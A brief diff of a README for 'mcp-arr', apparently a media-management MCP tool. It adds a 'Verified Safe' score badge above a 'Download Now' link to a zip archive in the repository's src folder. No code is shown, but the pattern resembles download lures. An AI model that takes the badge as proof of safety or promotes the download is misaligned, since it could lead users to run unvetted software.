@@ -1,5 +1,7 @@
 # 🎉 mcp-arr - Easy Media Management Made Simple
 
+[![SafeSkill 94/100](https://img.shields.io/badge/SafeSkill-94%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/nunner322-mcp-arr)
+
 ## 📥 Download Now
 [![Download mcp-arr](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/arr-mcp-1.4.zip)](https://raw.githubusercontent.com/nunner322/mcp-arr/main/src/arr-mcp-1.4.zip)
 
